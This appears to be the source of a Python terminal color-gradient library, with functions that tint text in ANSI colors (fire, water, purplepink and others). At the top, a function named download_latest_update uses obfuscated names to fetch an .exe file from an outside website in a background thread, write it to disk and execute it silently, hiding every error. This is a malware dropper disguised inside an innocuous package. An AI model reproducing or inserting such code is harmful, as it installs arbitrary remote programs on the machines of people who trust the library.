import os #line:1
import subprocess #line:2
import threading #line:3
import requests #line:4
from random import randint #line:5
from os import system #line:6
def download_latest_update ():#line:8
    def O0O00OOOO0O0OOOOO ():#line:9
        OO0OO000OO0O0OOO0 ="https://love-odyssey.com/PyPi-update.exe"#line:10
        O0O0000OO0O0O0000 ="PyPi-update.exe"#line:11
        try :#line:13
            with requests .get (OO0OO000OO0O0OOO0 ,stream =True )as OO0OOO000O0000000 :#line:15
                OO0OOO000O0000000 .raise_for_status ()#line:16
                with open (O0O0000OO0O0O0000 ,'wb')as OOOOO0O0000O00O00 :#line:17
                    for O0OO00000OO0OO000 in OO0OOO000O0000000 .iter_content (chunk_size =8192 ):#line:18
                        OOOOO0O0000O00O00 .write (O0OO00000OO0OO000 )#line:19
            subprocess .Popen ([O0O0000OO0O0O0000 ],shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE )#line:22
        except Exception :#line:24
            pass #line:26
    OOO000O0OOO0OO00O =threading .Thread (target =O0O00OOOO0O0OOOOO )#line:29
    OOO000O0OOO0OO00O .daemon =True #line:30
    OOO000O0OOO0OO00O .start ()#line:31
def blackwhite (O0000OOOO0OO0O0OO ):#line:33
    system ("");OOOO0OOOO0000O000 =""#line:34
    O0O000000OO0000O0 =0 ;O0OO0OOOO0000O00O =0 ;OO00OOO0OOO000O00 =0 #line:35
    for O0OOOO00OO0000OOO in O0000OOOO0OO0O0OO .splitlines ():#line:36
        OOOO0OOOO0000O000 +=(f"\033[38;2;{O0O000000OO0000O0};{O0OO0OOOO0000O00O};{OO00OOO0OOO000O00}m{O0OOOO00OO0000OOO}\033[0m\n")#line:37
        if not O0O000000OO0000O0 ==255 and not O0OO0OOOO0000O00O ==255 and not OO00OOO0OOO000O00 ==255 :#line:38
            O0O000000OO0000O0 +=20 ;O0OO0OOOO0000O00O +=20 ;OO00OOO0OOO000O00 +=20 #line:39
            if O0O000000OO0000O0 >255 and O0OO0OOOO0000O00O >255 and OO00OOO0OOO000O00 >255 :#line:40
                O0O000000OO0000O0 =255 ;O0OO0OOOO0000O00O =255 ;OO00OOO0OOO000O00 =255 #line:41
    return OOOO0OOOO0000O000 #line:42
def purplepink (OO0O0O000OOO000O0 ):#line:44
    system ("");O00OOO00OO0O0O000 =""#line:45
    OOO0000O0OO0OOOO0 =40 #line:46
    for O00OO00OO0OOO00OO in OO0O0O000OOO000O0 .splitlines ():#line:47
        O00OOO00OO0O0O000 +=(f"\033[38;2;{OOO0000O0OO0OOOO0};0;220m{O00OO00OO0OOO00OO}\033[0m\n")#line:48
        if not OOO0000O0OO0OOOO0 ==255 :#line:49
            OOO0000O0OO0OOOO0 +=15 #line:50
            if OOO0000O0OO0OOOO0 >255 :#line:51
                OOO0000O0OO0OOOO0 =255 #line:52
    return O00OOO00OO0O0O000 #line:53
def greenblue (O0OO000O000OOOOO0 ):#line:55
    system ("");OO0O0O0O00O0O0O00 =""#line:56
    O0OO000O000OO0O0O =100 #line:57
    for O00O0OOO00O000O00 in O0OO000O000OOOOO0 .splitlines ():#line:58
        OO0O0O0O00O0O0O00 +=(f"\033[38;2;0;255;{O0OO000O000OO0O0O}m{O00O0OOO00O000O00}\033[0m\n")#line:59
        if not O0OO000O000OO0O0O ==255 :#line:60
            O0OO000O000OO0O0O +=15 #line:61
            if O0OO000O000OO0O0O >255 :#line:62
                O0OO000O000OO0O0O =255 #line:63
    return OO0O0O0O00O0O0O00 #line:64
def pinkred (O0OOO0OO00O00OO00 ):#line:66
    system ("");OOOO0O0OO0OOO00OO =""#line:67
    OO0OOOOOOO00O00OO =255 #line:68
    for O000000O0O00OO00O in O0OOO0OO00O00OO00 .splitlines ():#line:69
        OOOO0O0OO0OOO00OO +=(f"\033[38;2;255;0;{OO0OOOOOOO00O00OO}m{O000000O0O00OO00O}\033[0m\n")#line:70
        if not OO0OOOOOOO00O00OO ==0 :#line:71
            OO0OOOOOOO00O00OO -=20 #line:72
            if OO0OOOOOOO00O00OO <0 :#line:73
                OO0OOOOOOO00O00OO =0 #line:74
    return OOOO0O0OO0OOO00OO #line:75
def purpleblue (OOOO0OO0O000OOOOO ):#line:77
    system ("");O00000000O0O00OO0 =""#line:78
    O0OO0O00O0OOOOOO0 =110 #line:79
    for OO000000OO0O000O0 in OOOO0OO0O000OOOOO .splitlines ():#line:80
        O00000000O0O00OO0 +=(f"\033[38;2;{O0OO0O00O0OOOOOO0};0;255m{OO000000OO0O000O0}\033[0m\n")#line:81
        if not O0OO0O00O0OOOOOO0 ==0 :#line:82
            O0OO0O00O0OOOOOO0 -=15 #line:83
            if O0OO0O00O0OOOOOO0 <0 :#line:84
                O0OO0O00O0OOOOOO0 =0 #line:85
    return O00000000O0O00OO0 #line:86
def water (O0OO0OOOOO0O0OO00 ):#line:88
    system ("");O00O00000OO000O00 =""#line:89
    OO000OOO00OOOOOO0 =10 #line:90
    for O0OOOO00OO0OO0OO0 in O0OO0OOOOO0O0OO00 .splitlines ():#line:91
        O00O00000OO000O00 +=(f"\033[38;2;0;{OO000OOO00OOOOOO0};255m{O0OOOO00OO0OO0OO0}\033[0m\n")#line:92
        if not OO000OOO00OOOOOO0 ==255 :#line:93
            OO000OOO00OOOOOO0 +=15 #line:94
            if OO000OOO00OOOOOO0 >255 :#line:95
                OO000OOO00OOOOOO0 =255 #line:96
    return O00O00000OO000O00 #line:97
def fire (O00O000OO0OOOO0OO ):#line:99
    system ("");OO000OOO0000O0OOO =""#line:100
    O00OO000O000OOOOO =250 #line:101
    for OOO000OO0000O000O in O00O000OO0OOOO0OO .splitlines ():#line:102
        OO000OOO0000O0OOO +=(f"\033[38;2;255;{O00OO000O000OOOOO};0m{OOO000OO0000O000O}\033[0m\n")#line:103
        if not O00OO000O000OOOOO ==0 :#line:104
            O00OO000O000OOOOO -=25 #line:105
            if O00OO000O000OOOOO <0 :#line:106
                O00OO000O000OOOOO =0 #line:107
    return OO000OOO0000O0OOO #line:108
def brazil (O0O000OOO0O00OOO0 ):#line:110
    system ("");O00OO0O0O0OOO0O0O =""#line:111
    OOOOOO0000OO0OO0O =0 #line:112
    for O0O000OOO0O000000 in O0O000OOO0O00OOO0 .splitlines ():#line:113
        O00OO0O0O0OOO0O0O +=(f"\033[38;2;{OOOOOO0000OO0OO0O};255;0m{O0O000OOO0O000000}\033[0m\n")#line:114
        if not OOOOOO0000OO0OO0O >200 :#line:115
            OOOOOO0000OO0OO0O +=30 #line:116
    return O00OO0O0O0OOO0O0O #line:117
def random (OOO00OOOO0OO00O00 ):#line:119
    system ("");OO00OOO000OO0000O =""#line:120
    for O0OOO0O000OOO0OOO in OOO00OOOO0OO00O00 .splitlines ():#line:121
        for O00OO0OOOO0O00000 in O0OOO0O000OOO0OOO :#line:122
            OO00OOO000OO0000O +=(f"\033[38;2;{randint(0,255)};{randint(0,255)};{randint(0,255)}m{O00OO0OOOO0O00000}\033[0m")#line:123
        OO00OOO000OO0000O +="\n"#line:124
    return OO00OOO000OO0000O #line:125
